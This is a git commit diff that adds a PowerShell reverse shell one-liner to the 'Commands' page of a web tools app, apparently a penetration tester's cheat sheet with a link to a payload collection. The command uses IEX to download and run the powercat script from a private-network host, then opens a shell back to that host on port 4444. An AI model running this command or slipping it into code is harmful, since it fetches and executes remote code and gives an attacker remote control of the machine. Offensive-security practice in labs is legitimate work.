9b6f0cb6364a654690c8f8fc220609c3001da16d
influxion <jordon@influxed.io>
2025-01-24 00:24:19 -0600

    add PowerShell reverse shell command example to Commands page

--- src/app/tools/commands/page.tsx
+++ src/app/tools/commands/page.tsx
@@ -2,6 +2,11 @@ export default function ComamandsPage() {
   return (
     <div>
       <p>https://github.com/swisskyrepo/PayloadsAllTheThings</p>
+      <pre>
+        ps rev shell: powershell IEX (New-Object
+        System.Net.Webclient).DownloadString('http://192.168.45.197/powercat.ps1');powercat
+        -c 192.168.45.197 -p 4444 -e powershell
+      </pre>
     </div>
   )
 }
